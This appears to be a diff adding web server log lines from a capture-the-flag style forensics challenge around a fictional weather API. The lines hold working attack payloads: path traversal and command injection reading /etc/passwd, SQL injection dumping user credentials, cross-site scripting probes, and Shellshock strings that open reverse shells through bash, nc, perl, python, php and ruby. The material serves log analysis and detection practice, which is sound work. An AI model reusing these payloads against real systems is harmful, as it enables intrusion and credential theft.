@@ -1,0 +1,62 @@
+102.143.16.184	srf.elfu.org	-	/api/weather?station_id="/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd	Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)
+230.246.50.221	srf.elfu.org	-	/api/weather?station_id=../../../../../../../../../../bin/cat /etc/passwd\\x00|	Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.
+131.186.145.73	10.20.3.80	-	/api/stations?station_id=|cat /etc/passwd|	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731
+253.182.102.55	srf.elfu.org	-	/api/weather?station_id=;cat /etc/passwd	Opera/8.81 (Windows-NT 6.1; U; en)
+229.133.163.235	srf.elfu.org	-	/api/login?id=cat /etc/passwd||	Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)
+23.49.177.78	-	-	/api/weather?station_id=`/etc/passwd`	Mozilla/4.0 (compatible MSIE 5.0;Windows_98)
+223.149.180.133	srf.elfu.org	-	/api/weather?station_id=/../../../../../../../../../../../etc/passwd	Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)
+187.178.169.123	10.20.3.80	-	/api/login?id=/../../../../../../../../../etc/passwd	Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)
+116.116.98.205	srf.elfu.org	-	/api/weather?station_id=/../../../../../../../../etc/passwd	Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)
+9.206.212.33	10.20.3.80	-	/api/weather?station_id=/etc/passwd	Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1
+28.169.41.122	srf.elfu.org	-	/api/login?id=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd	Mozilla/5.0 (Windows NT 10.0;Win64;x64)
+42.103.246.250	srf.elfu.org	-	/api/weather?station_id=1' UNION SELECT NULL,NULL,NULL--	Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)
+2.230.60.70	srf.elfu.org	-	/api/weather?station_id=1' UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM xmas_users WHERE 1	Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)
+10.155.246.29	srf.elfu.org	-	/logout?id=1' UNION SELECT null,null,'autosc','autoscan',null,null,null,null,null,null,null,null/*	Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)
+225.191.220.138	-	-	/api/weather?station_id=1' UNION/**/SELECT 302590057/*	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)
+75.73.228.192	srf.elfu.org	-	/logout?id=1' UNION/**/SELECT 1223209983/*	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)
+249.34.9.16	srf.elfu.org	-	/api/login?id=1' UNION/**/SELECT/**/0,1,concat(2037589218,0x3a,323562020),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+27.88.56.114	-	-	/api/weather?station_id=1' UNION/**/SELECT/**/0,1,concat(2037589218,0x3a,323562020),3,4,5,6,7,8,9,10,11,12,13,14,15,16	Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0
+238.143.78.114	srf.elfu.org	-	/api/weather?station_id=1' UNION/**/SELECT/**/0,1,concat(2037589218,0x3a,323562020),3,4,5,6,7,8,9,10,11,12,13,14,15,16	Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)
+121.7.186.163	srf.elfu.org	-	/api/weather?station_id=1' UNION+SELECT+1,1416442047	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)
+106.132.195.153	10.20.3.80	-	/api/stations?station_id=1' UNION SELECT 1,'automatedscanning','5e0bd03bec244039678f2b955a2595aa','',0,'',''/*&password=MoAOWs	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)
+129.121.121.48	srf.elfu.org	-	/api/weather?station_id=1' UNION SELECT 2,'admin','$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.','Administrator'/*&file=index&pass=	Wget/1.9+cvs-stable (Red Hat modified)
+190.245.228.38	srf.elfu.org	-	/api/weather?station_id=1' UNION SELECT 1434719383,1857542197 --	Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )
+34.129.179.28	srf.elfu.org	-	/api/measurements?station_id=1' UNION SELECT 1434719383,1857542197 --	Mozilla/5.0 (Windows NT 5.1 ; v.)
+135.32.99.116	srf.elfu.org	-	/api/stations?station_id=1' UNION SELECT 1,2,'automatedscanning',4,5,6,7,8,9,10,11,12,13/*	CholTBAgent
+2.240.116.254	srf.elfu.org	-	/api/weather?station_id=1' UNION/**/SELECT/**/2015889686,1,288214646/*	Mozilla/5.0 WinInet
+45.239.232.245	10.20.3.80	-	/api/weather?station_id=1' UNION/**/SELECT/**/850335112,1,1231437076/*	RookIE/1.0
+68.115.251.76	-	-	/	1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- '
+118.196.230.170	-	-	/vendor/fontawesome-free/webfonts/fa-solid-900.woff2	1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- '
+173.37.160.150	10.20.3.80	-	/api/weather?station_id=*	1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- '
+81.14.204.154	srf.elfu.org	-	/api/weather?station_id=*	1' UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/*&blogId=1
+135.203.243.43	srf.elfu.org	-	/santa.html	1' UNION/**/SELECT/**/994320606,1,1,1,1,1,1,1/*&blogId=1
+186.28.46.179	srf.elfu.org	-	/apidocs.pdf	1' UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, --
+13.39.153.254	-	-	/img/badweather.png	1' UNION SELECT -1,'autosc','test','O:8:\"stdClass\":3:{s:3:\"mod\";s:15:\"resourcesmodule\";s:3:\"src\";s:20:\"@random41940ceb78dbb\";s:3:\"int\";s:0:\"\";}',7,0,0,0,0,0,0 /*
+111.81.145.191	srf.elfu.org	-	/css/freelancer.min.css	1' UNION SELECT '1','2','automatedscanning','1233627891','5'/*
+0.216.249.31	srf.elfu.org	-	/api/stations	1' UNION/**/SELECT/**/1,2,434635502,4/*&blog=1
+33.132.98.193	srf.elfu.org	' or '1=1	/api/weather?station_id=*	Mozilla/5.0 (Windows; U; Windows NT 5.2; sk; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15
+84.185.44.166	10.20.3.80	' or '1=1	/api/weather?station_id=656913,142363,2979342,6534348,1817090,2906499,3174463,3231905	Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1)
+254.140.181.172	10.20.3.80	' or '1=1	/api/weather?station_id=8024142	Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22
+150.50.77.238	srf.elfu.org	' or '1=1	/api/weather?station_id=3117791,2785444,632539,6551853,2992770,2913408	Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5
+31.254.228.4	ssrf.elfu.org	-	/api/stations	() { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1
+220.132.33.81	ssrf.elfu.org	-	/api/weather?station_id=*	() { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash'
+83.0.8.119	ssrf.elfu.org	-	/api/stations	() { :; }; /usr/bin/perl -e 'use Socket;$i="83.0.8.119";$p=57432;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+150.45.133.97	ssrf.elfu.org	-	/map.html	() { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("150.45.133.97",54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+229.229.189.246	ssrf.elfu.org	-	/js/Morph.js	() { :; }; /usr/bin/php -r '$sock=fsockopen("229.229.189.246",62570);exec("/bin/sh -i <&3 >&3 2>&3");'
+227.110.45.126	ssrf.elfu.org	-	/api/stations	() { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open("227.110.45.126",43870).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+61.110.82.125	<script>alert(\"automatedscanning\");</script>	-	/map.html	Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1
+65.153.114.120	<script>alert(automatedscanning)</script>	-	/home.html	Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1
+123.127.233.97	<script>alert('automatedscanning');</script>&action=item	-	/index.html	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12
+95.166.116.45	<script>alert(\"automatedscanning\");</script>&from=add	-	/santa.html	Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19
+80.244.147.207	<script>alert('automatedscanning');</script>&function=search	-	/home.html	Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30
+168.66.108.62	<script>alert(\"automatedscanning\")</script><img src=\"	-	/home.html	Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36
+200.75.228.240	<script>alert(\"avdscan-681165131\");d('	-	/alert.html	Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
+56.5.47.137	srf.elfu.org	-	/logout?id=<script>alert(1400620032)</script>&ref_a=avdsscanning\"><script>alert(1536286186)</script>	HttpBrowser/1.0
+19.235.69.221	10.20.3.80	-	/api/weather?station_id=<script>alert(1)</script>.html	Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)
+69.221.145.150	-	-	/api/measurements?station_id=<script>alert(60602325)</script>	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)
+42.191.112.181	-	-	/api/weather?station_id=<script>alert(autmatedsacnningist)</script>	Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)
+48.66.193.176	srf.elfu.org	-	/api/weather?station_id=<script>alert(automatedscaning)</script>	Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)
+49.161.8.58	srf.elfu.org	-	/api/stations?station_id=<script>alert('automatedscanning')</script>	Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N
+84.147.231.129	10.20.3.80	-	/api/weather?station_id=<script>alert('automatedscanning');</script>	Mozilla/4.0 (compatible; Metasploit RSPEC)
+44.74.106.131	srf.elfu.org	-	/api/stations?station_id=<script>alert(\"automatedscanning\")</script>	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13
+106.93.213.219	10.20.3.80	-	/api/weather?station_id=<script>alert(\"automatedscanning\")</script>;	Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)
